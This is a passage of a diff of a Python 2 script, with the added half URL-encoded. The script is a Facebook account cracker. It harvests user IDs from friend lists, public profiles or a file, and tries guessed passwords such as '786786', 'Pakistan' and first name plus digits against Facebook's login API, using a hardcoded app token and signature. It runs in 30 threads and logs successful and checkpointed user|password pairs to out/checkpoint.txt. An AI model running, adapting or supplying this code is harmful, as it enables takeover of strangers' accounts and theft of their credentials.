-								print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
-								oks.append(user+pass3)
-							else:
-								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
-									cek = open("out/checkpoint.txt", "a")
-									cek.write(user+"|"+pass3+"\n")
-									cek.close()
-									cekpoint.append(user+pass3)
-								else:
-									pass4 = 'Pakistan'
-									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-									q = json.load(data)
-									if 'access_token' in q:
-										print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
-										oks.append(user+pass4)
-									else:
-										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
-											cek = open("out/checkpoint.txt", "a")
-											cek.write(user+"|"+pass4+"\n")
-											cek.close()
-											cekpoint.append(user+pass4)
-										else:
-											pass5 = b['first_name'] + '12'
-											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-											q = json.load(data)
-											if 'access_token' in q:
-												print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
-												oks.append(user+pass5)
-											else:
-												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
-													cek = open("out/checkpoint.txt", "a")
-													cek.write(user+"|"+pass5+"\n")
-													cek.close()
-													cekpoint.append(user+pass5)
-												else:
-													pass6 = b['first_name'] + '1234'
-													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-													q = json.load(data)
-													if 'access_token' in q:
-														print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
-														oks.append(user+pass6)
-													else:
-														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
-															cek = open("out/checkpoint.txt", "a")
-															cek.write(user+"|"+pass6+"\n")
-															cek.close()
-															cekpoint.append(user+pass6)
-														else:
-															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-															b = json.loads(a.text)
-															pass7 = b['first_name'] + '1122'
-															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-															q = json.load(data)
-															if 'access_token' in q:
-																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-																oks.append(user+pass7)
-															else:
-																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-																	cek = open("out/checkpoint.txt", "a")
-																	cek.write(user+"|"+pass7+"\n")
-																	cek.close()
-																	cekpoint.append(user+pass7)
-																	
-															
-		except:
-			pass
-		
-	p = ThreadPool(30)
-	p.map(main, id)
-	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
-	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
-	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-	menu()
 
-if __name__ == '__main__':
-	login()
+def%20super%28%29%3A
+%09global%20toket
+%09os.system%28%27clear%27%29
+%09try%3A
+%09%09toket%3Dopen%28%27login.txt%27%2C%27r%27%29.read%28%29
+%09except%20IOError%3A
+%09%09print%22%5C033%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B91mToken%20invalid%22
+%09%09os.system%28%27rm%20-rf%20login.txt%27%29
+%09%09time.sleep%281%29
+%09%09login%28%29
+%09os.system%28%27clear%27%29
+%09print%20logo
+%09print%2042%2A%22%5C033%5B1%3B96m%3D%22
+%09print%20%22%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B92m1%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B93m%20Crack%20From%20Friend%20List%22
+%09print%20%22%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B92m2%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B93m%20Crack%20From%20Any%20Public%20ID%22
+%09print%20%22%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B92m3%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B93m%20Crack%20From%20File%22
+%09print%20%22%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B91m0%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B91m%20Back%22
+%09pilih_super%28%29
+
+def%20pilih_super%28%29%3A
+%09peak%20%3D%20raw_input%28%22%5Cn%5C033%5B1%3B97m%20%3E%3E%3E%20%5C033%5B1%3B97m%22%29
+%09if%20peak%20%3D%3D%22%22%3A
+%09%09print%20%22%5C033%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B91mFill%20in%20correctly%22
+%09%09pilih_super%28%29
+%09elif%20peak%20%3D%3D%221%22%3A
+%09%09os.system%28%27clear%27%29
+%09%09print%20logo
+%09%09print%2042%2A%22%5C033%5B1%3B96m%3D%22
+%09%09jalan%28%27%5C033%5B1%3B96m%5B%E2%9C%BA%5D%20%5C033%5B1%3B93mGetting%20ID%20%5C033%5B1%3B97m...%27%29
+%09%09r%20%3D%20requests.get%28%22https%3A%2F%2Fgraph.facebook.com%2Fme%2Ffriends%3Faccess_token%3D%22%2Btoket%29
+%09%09z%20%3D%20json.loads%28r.text%29
+%09%09for%20s%20in%20z%5B%27data%27%5D%3A
+%09%09%09id.append%28s%5B%27id%27%5D%29
+%09elif%20peak%20%3D%3D%222%22%3A
+%09%09os.system%28%27clear%27%29
+%09%09print%20logo
+%09%09print%2042%2A%22%5C033%5B1%3B96m%3D%22
+%09%09idt%20%3D%20raw_input%28%22%5C033%5B1%3B96m%5B%2B%5D%20%5C033%5B1%3B93mEnter%20ID%20%5C033%5B1%3B91m%3A%20%5C033%5B1%3B97m%22%29
+%09%09try%3A
+%09%09%09jok%20%3D%20requests.get%28%22https%3A%2F%2Fgraph.facebook.com%2F%22%2Bidt%2B%22%3Faccess_token%3D%22%2Btoket%29
+%09%09%09op%20%3D%20json.loads%28jok.text%29
+%09%09%09print%22%5C033%5B1%3B96m%5B%5C033%5B1%3B97m%E2%9C%93%5C033%5B1%3B96m%5D%20%5C033%5B1%3B93mName%5C033%5B1%3B91m%20%3A%5C033%5B1%3B97m%20%22%2Bop%5B%22name%22%5D
+%09%09except%20KeyError%3A
+%09%09%09print%22%5C033%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B91mID%20Not%20Found%21%22
+%09%09%09raw_input%28%22%5Cn%5C033%5B1%3B96m%5B%5C033%5B1%3B97mBack%5C033%5B1%3B96m%5D%22%29
+%09%09%09super%28%29
+%09%09jalan%28%27%5C033%5B1%3B96m%5B%E2%9C%BA%5D%20%5C033%5B1%3B93mGetting%20IDs%20%5C033%5B1%3B97m...%27%29
+%09%09r%20%3D%20requests.get%28%22https%3A%2F%2Fgraph.facebook.com%2F%22%2Bidt%2B%22%2Ffriends%3Faccess_token%3D%22%2Btoket%29
+%09%09z%20%3D%20json.loads%28r.text%29
+%09%09for%20i%20in%20z%5B%27data%27%5D%3A
+%09%09%09id.append%28i%5B%27id%27%5D%29
+%09elif%20peak%20%3D%3D%223%22%3A
+%09%09os.system%28%27clear%27%29
+%09%09print%20logo
+%09%09print%2042%2A%22%5C033%5B1%3B96m%3D%22
+%09%09try%3A
+%09%09%09idlist%20%3D%20raw_input%28%27%5Cx1b%5B1%3B96m%5B%2B%5D%20%5Cx1b%5B1%3B93mEnter%20File%20Path%20%20%5Cx1b%5B1%3B91m%3A%20%5Cx1b%5B1%3B97m%27%29
+%09%09%09for%20line%20in%20open%28idlist%2C%27r%27%29.readlines%28%29%3A
+%09%09%09%09id.append%28line.strip%28%29%29
+%09%09except%20IOError%3A
+%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B91mFile%20Not%20Found%27
+%09%09%09raw_input%28%27%5Cn%5Cx1b%5B1%3B96m%5B%20%5Cx1b%5B1%3B97mBack%20%5Cx1b%5B1%3B96m%5D%27%29
+%09%09%09super%28%29
+%09elif%20peak%20%3D%3D%220%22%3A
+%09%09menu%28%29
+%09else%3A
+%09%09print%20%22%5C033%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B91mFill%20in%20correctly%22
+%09%09pilih_super%28%29
+%09
+%09print%20%22%5C033%5B1%3B96m%5B%2B%5D%20%5C033%5B1%3B93mTotal%20IDs%20%5C033%5B1%3B91m%3A%20%5C033%5B1%3B97m%22%2Bstr%28len%28id%29%29
+%09jalan%28%27%5C033%5B1%3B96m%5B%E2%9C%BA%5D%20%5C033%5B1%3B93mStarting%20%5C033%5B1%3B97m...%27%29
+%09titik%20%3D%20%5B%27.%20%20%20%27%2C%27..%20%20%27%2C%27...%20%27%5D
+%09for%20o%20in%20titik%3A
+%09%09print%28%22%5Cr%5C033%5B1%3B96m%5B%5C033%5B1%3B97m%E2%9C%B8%5C033%5B1%3B96m%5D%20%5C033%5B1%3B93mCracking%20%5C033%5B1%3B97m%22%2Bo%29%2C%3Bsys.stdout.flush%28%29%3Btime.sleep%281%29
+%09print
+%09print%28%27%5Cx1b%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B93mTo%20Stop%20Process%20Press%20CTRL%20Then%20Press%20z%27%29
+%09print%2042%2A%22%5C033%5B1%3B96m%3D%22
+%09
+%09%09%09
+%09def%20main%28arg%29%3A
+%09%09global%20cekpoint%2Coks
+%09%09user%20%3D%20arg
+%09%09try%3A
+%09%09%09os.mkdir%28%27out%27%29
+%09%09except%20OSError%3A
+%09%09%09pass
+%09%09try%3A
+%09%09%09a%20%3D%20requests.get%28%27https%3A%2F%2Fgraph.facebook.com%2F%27%2Buser%2B%27%2F%3Faccess_token%3D%27%2Btoket%29
+%09%09%09b%20%3D%20json.loads%28a.text%29
+%09%09%09pass1%20%3D%20%28%27786786%27%29
+%09%09%09data%20%3D%20urllib.urlopen%28%22https%3A%2F%2Fb-api.facebook.com%2Fmethod%2Fauth.login%3Faccess_token%3D237759909591655%2525257C0f140aabedfb65ac27a739ed1a2263b1%26format%3Djson%26sdk_version%3D2%26email%3D%22%2B%28user%29%2B%22%26locale%3Den_US%26password%3D%22%2B%28pass1%29%2B%22%26sdk%3Dios%26generate_session_cookies%3D1%26sig%3D3f555f99fb61fcd7aa0c44f58f522ef6%22%29
+%09%09%09q%20%3D%20json.load%28data%29
+%09%09%09if%20%27access_token%27%20in%20q%3A
+%09%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B92mSuccessful%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B97m%20%27%20%2B%20user%20%2B%20%27%20%5Cx1b%5B1%3B96m%7C%5Cx1b%5B1%3B97m%20%27%20%2B%20pass1
+%09%09%09%09oks.append%28user%2Bpass1%29
+%09%09%09else%3A
+%09%09%09%09if%20%27www.facebook.com%27%20in%20q%5B%22error_msg%22%5D%3A
+%09%09%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B93mCheckpoint%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B97m%20%27%20%2B%20user%20%2B%20%27%20%5Cx1b%5B1%3B96m%7C%5Cx1b%5B1%3B97m%20%27%20%2B%20pass1
+%09%09%09%09%09cek%20%3D%20open%28%22out%2Fcheckpoint.txt%22%2C%20%22a%22%29
+%09%09%09%09%09cek.write%28user%2B%22%7C%22%2Bpass1%2B%22%5Cn%22%29
+%09%09%09%09%09cek.close%28%29
+%09%09%09%09%09cekpoint.append%28user%2Bpass1%29
+%09%09%09%09else%3A
+%09%09%09%09%09pass2%20%3D%20b%5B%27first_name%27%5D%2B%2712345%27
+%09%09%09%09%09data%20%3D%20urllib.urlopen%28%22https%3A%2F%2Fb-api.facebook.com%2Fmethod%2Fauth.login%3Faccess_token%3D237759909591655%2525257C0f140aabedfb65ac27a739ed1a2263b1%26format%3Djson%26sdk_version%3D2%26email%3D%22%2B%28user%29%2B%22%26locale%3Den_US%26password%3D%22%2B%28pass2%29%2B%22%26sdk%3Dios%26generate_session_cookies%3D1%26sig%3D3f555f99fb61fcd7aa0c44f58f522ef6%22%29
+%09%09%09%09%09q%20%3D%20json.load%28data%29
+%09%09%09%09%09if%20%27access_token%27%20in%20q%3A
+%09%09%09%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B92mSuccessful%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B97m%20%27%20%2B%20user%20%2B%20%27%20%5Cx1b%5B1%3B96m%7C%5Cx1b%5B1%3B97m%20%27%20%2B%20pass2
+%09%09%09%09%09%09oks.append%28user%2Bpass2%29
+%09%09%09%09%09else%3A
+%09%09%09%09%09%09if%20%27www.facebook.com%27%20in%20q%5B%22error_msg%22%5D%3A
+%09%09%09%09%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B93mCheckpoint%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B97m%20%27%20%2B%20user%20%2B%20%27%20%5Cx1b%5B1%3B96m%7C%5Cx1b%5B1%3B97m%20%27%20%2B%20pass2
+%09%09%09%09%09%09%09cek%20%3D%20open%28%22out%2Fcheckpoint.txt%22%2C%20%22a%22%29
+%09%09%09%09%09%09%09cek.write%28user%2B%22%7C%22%2Bpass2%2B%22%5Cn%22%29
+%09%09%09%09%09%09%09cek.close%28%29
+%09%09%09%09%09%09%09cekpoint.append%28user%2Bpass2%29
+%09%09%09%09%09%09else%3A
+%09%09%09%09%09%09%09pass3%20%3D%20b%5B%27first_name%27%5D%20%2B%20%27123%27
+%09%09%09%09%09%09%09data%20%3D%20urllib.urlopen%28%22https%3A%2F%2Fb-api.facebook.com%2Fmethod%2Fauth.login%3Faccess_token%3D237759909591655%2525257C0f140aabedfb65ac27a739ed1a2263b1%26format%3Djson%26sdk_version%3D2%26email%3D%22%2B%28user%29%2B%22%26locale%3Den_US%26password%3D%22%2B%28pass3%29%2B%22%26sdk%3Dios%26generate_session_cookies%3D1%26sig%3D3f555f99fb61fcd7aa0c44f58f522ef6%22%29
+%09%09%09%09%09%09%09q%20%3D%20json.load%28data%29
+%09%09%09%09%09%09%09if%20%27access_token%27%20in%20q%3A
+%09%09%09%09%09%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B92mSuccessful%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B97m%20%27%20%2B%20user%20%2B%20%27%20%5Cx1b%5B1%3B96m%7C%5Cx1b%5B1%3B97m%20%27%20%2B%20pass3
+%09%09%09%09%09%09%09%09oks.append%28user%2Bpass3%29
+%09%09%09%09%09%09%09else%3A
+%09%09%09%09%09%09%09%09if%20%27www.facebook.com%27%20in%20q%5B%22error_msg%22%5D%3A
+%09%09%09%09%09%09%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B93mCheckpoint%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B97m%20%27%20%2B%20user%20%2B%20%27%20%5Cx1b%5B1%3B96m%7C%5Cx1b%5B1%3B97m%20%27%20%2B%20pass3
+%09%09%09%09%09%09%09%09%09cek%20%3D%20open%28%22out%2Fcheckpoint.txt%22%2C%20%22a%22%29
+%09%09%09%09%09%09%09%09%09cek.write%28user%2B%22%7C%22%2Bpass3%2B%22%5Cn%22%29
+%09%09%09%09%09%09%09%09%09cek.close%28%29
+%09%09%09%09%09%09%09%09%09cekpoint.append%28user%2Bpass3%29
+%09%09%09%09%09%09%09%09else%3A
+%09%09%09%09%09%09%09%09%09pass4%20%3D%20%27Pakistan%27
+%09%09%09%09%09%09%09%09%09data%20%3D%20urllib.urlopen%28%22https%3A%2F%2Fb-api.facebook.com%2Fmethod%2Fauth.login%3Faccess_token%3D237759909591655%2525257C0f140aabedfb65ac27a739ed1a2263b1%26format%3Djson%26sdk_version%3D2%26email%3D%22%2B%28user%29%2B%22%26locale%3Den_US%26password%3D%22%2B%28pass4%29%2B%22%26sdk%3Dios%26generate_session_cookies%3D1%26sig%3D3f555f99fb61fcd7aa0c44f58f522ef6%22%29
+%09%09%09%09%09%09%09%09%09q%20%3D%20json.load%28data%29
+%09%09%09%09%09%09%09%09%09if%20%27access_token%27%20in%20q%3A
+%09%09%09%09%09%09%09%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B92mSuccessful%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B97m%20%27%20%2B%20user%20%2B%20%27%20%5Cx1b%5B1%3B96m%7C%5Cx1b%5B1%3B97m%20%27%20%2B%20pass4
+%09%09%09%09%09%09%09%09%09%09oks.append%28user%2Bpass4%29
+%09%09%09%09%09%09%09%09%09else%3A
+%09%09%09%09%09%09%09%09%09%09if%20%27www.facebook.com%27%20in%20q%5B%22error_msg%22%5D%3A
+%09%09%09%09%09%09%09%09%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B93mCheckpoint%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B97m%20%27%20%2B%20user%20%2B%20%27%20%5Cx1b%5B1%3B96m%7C%5Cx1b%5B1%3B97m%20%27%20%2B%20pass4
+%09%09%09%09%09%09%09%09%09%09%09cek%20%3D%20open%28%22out%2Fcheckpoint.txt%22%2C%20%22a%22%29
+%09%09%09%09%09%09%09%09%09%09%09cek.write%28user%2B%22%7C%22%2Bpass4%2B%22%5Cn%22%29
+%09%09%09%09%09%09%09%09%09%09%09cek.close%28%29
+%09%09%09%09%09%09%09%09%09%09%09cekpoint.append%28user%2Bpass4%29
+%09%09%09%09%09%09%09%09%09%09else%3A
+%09%09%09%09%09%09%09%09%09%09%09pass5%20%3D%20b%5B%27first_name%27%5D%20%2B%20%2712%27
+%09%09%09%09%09%09%09%09%09%09%09data%20%3D%20urllib.urlopen%28%22https%3A%2F%2Fb-api.facebook.com%2Fmethod%2Fauth.login%3Faccess_token%3D237759909591655%2525257C0f140aabedfb65ac27a739ed1a2263b1%26format%3Djson%26sdk_version%3D2%26email%3D%22%2B%28user%29%2B%22%26locale%3Den_US%26password%3D%22%2B%28pass5%29%2B%22%26sdk%3Dios%26generate_session_cookies%3D1%26sig%3D3f555f99fb61fcd7aa0c44f58f522ef6%22%29
+%09%09%09%09%09%09%09%09%09%09%09q%20%3D%20json.load%28data%29
+%09%09%09%09%09%09%09%09%09%09%09if%20%27access_token%27%20in%20q%3A
+%09%09%09%09%09%09%09%09%09%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B92mSuccessful%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B97m%20%27%20%2B%20user%20%2B%20%27%20%5Cx1b%5B1%3B96m%7C%5Cx1b%5B1%3B97m%20%27%20%2B%20pass5
+%09%09%09%09%09%09%09%09%09%09%09%09oks.append%28user%2Bpass5%29
+%09%09%09%09%09%09%09%09%09%09%09else%3A
+%09%09%09%09%09%09%09%09%09%09%09%09if%20%27www.facebook.com%27%20in%20q%5B%22error_msg%22%5D%3A
+%09%09%09%09%09%09%09%09%09%09%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B93mCheckpoint%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B97m%20%27%20%2B%20user%20%2B%20%27%20%5Cx1b%5B1%3B96m%7C%5Cx1b%5B1%3B97m%20%27%20%2B%20pass5
+%09%09%09%09%09%09%09%09%09%09%09%09%09cek%20%3D%20open%28%22out%2Fcheckpoint.txt%22%2C%20%22a%22%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09cek.write%28user%2B%22%7C%22%2Bpass5%2B%22%5Cn%22%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09cek.close%28%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09cekpoint.append%28user%2Bpass5%29
+%09%09%09%09%09%09%09%09%09%09%09%09else%3A
+%09%09%09%09%09%09%09%09%09%09%09%09%09pass6%20%3D%20b%5B%27first_name%27%5D%20%2B%20%271234%27
+%09%09%09%09%09%09%09%09%09%09%09%09%09data%20%3D%20urllib.urlopen%28%22https%3A%2F%2Fb-api.facebook.com%2Fmethod%2Fauth.login%3Faccess_token%3D237759909591655%2525257C0f140aabedfb65ac27a739ed1a2263b1%26format%3Djson%26sdk_version%3D2%26email%3D%22%2B%28user%29%2B%22%26locale%3Den_US%26password%3D%22%2B%28pass6%29%2B%22%26sdk%3Dios%26generate_session_cookies%3D1%26sig%3D3f555f99fb61fcd7aa0c44f58f522ef6%22%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09q%20%3D%20json.load%28data%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09if%20%27access_token%27%20in%20q%3A
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B92mSuccessful%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B97m%20%27%20%2B%20user%20%2B%20%27%20%5Cx1b%5B1%3B96m%7C%5Cx1b%5B1%3B97m%20%27%20%2B%20pass6
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09oks.append%28user%2Bpass6%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09else%3A
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09if%20%27www.facebook.com%27%20in%20q%5B%22error_msg%22%5D%3A
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B93mCheckpoint%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B97m%20%27%20%2B%20user%20%2B%20%27%20%5Cx1b%5B1%3B96m%7C%5Cx1b%5B1%3B97m%20%27%20%2B%20pass6
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09cek%20%3D%20open%28%22out%2Fcheckpoint.txt%22%2C%20%22a%22%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09cek.write%28user%2B%22%7C%22%2Bpass6%2B%22%5Cn%22%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09cek.close%28%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09cekpoint.append%28user%2Bpass6%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09else%3A
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09a%20%3D%20requests.get%28%27https%3A%2F%2Fgraph.facebook.com%2F%27%2Buser%2B%27%2F%3Faccess_token%3D%27%2Btoket%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09b%20%3D%20json.loads%28a.text%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09pass7%20%3D%20b%5B%27first_name%27%5D%20%2B%20%271122%27
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09data%20%3D%20urllib.urlopen%28%22https%3A%2F%2Fb-api.facebook.com%2Fmethod%2Fauth.login%3Faccess_token%3D237759909591655%2525257C0f140aabedfb65ac27a739ed1a2263b1%26format%3Djson%26sdk_version%3D2%26email%3D%22%2B%28user%29%2B%22%26locale%3Den_US%26password%3D%22%2B%28pass7%29%2B%22%26sdk%3Dios%26generate_session_cookies%3D1%26sig%3D3f555f99fb61fcd7aa0c44f58f522ef6%22%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09q%20%3D%20json.load%28data%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09if%20%27access_token%27%20in%20q%3A
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B92mSuccessful%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B97m%20%27%20%2B%20user%20%2B%20%27%20%5Cx1b%5B1%3B96m%7C%5Cx1b%5B1%3B97m%20%27%20%2B%20pass7
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09oks.append%28user%2Bpass7%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09else%3A
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09if%20%27www.facebook.com%27%20in%20q%5B%22error_msg%22%5D%3A
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09print%20%27%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B93mCheckpoint%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B97m%20%27%20%2B%20user%20%2B%20%27%20%5Cx1b%5B1%3B96m%7C%5Cx1b%5B1%3B97m%20%27%20%2B%20pass7
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09cek%20%3D%20open%28%22out%2Fcheckpoint.txt%22%2C%20%22a%22%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09cek.write%28user%2B%22%7C%22%2Bpass7%2B%22%5Cn%22%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09cek.close%28%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09cekpoint.append%28user%2Bpass7%29
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09
+%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09
+%09%09except%3A
+%09%09%09pass
+%09%09
+%09p%20%3D%20ThreadPool%2830%29
+%09p.map%28main%2C%20id%29
+%09print%2042%2A%22%5C033%5B1%3B96m%3D%22
+%09print%20%27%5C033%5B1%3B96m%5B%5C033%5B1%3B97m%E2%9C%93%5C033%5B1%3B96m%5D%20%5C033%5B1%3B92mProcess%20Has%20Been%20Completed%20%5C033%5B1%3B97m....%27
+%09print%22%5C033%5B1%3B96m%5B%2B%5D%20%5C033%5B1%3B92mTotal%20OK%2F%5Cx1b%5B1%3B93mCP%20%5C033%5B1%3B91m%3A%20%5C033%5B1%3B92m%22%2Bstr%28len%28oks%29%29%2B%22%5C033%5B1%3B97m%2F%5C033%5B1%3B93m%22%2Bstr%28len%28cekpoint%29%29
+%09print%28%22%5C033%5B1%3B96m%5B%2B%5D%20%5C033%5B1%3B92mCP%20File%20Has%20Been%20Saved%20%5C033%5B1%3B91m%3A%20%5C033%5B1%3B97mout%2Fcheckpoint.txt%22%29
+%09raw_input%28%22%5Cn%5C033%5B1%3B96m%5B%5C033%5B1%3B97mBack%5C033%5B1%3B96m%5D%22%29
+%09menu%28%29
+
+if%20__name__%20%3D%3D%20%27__main__%27%3A
+%09login%28%29
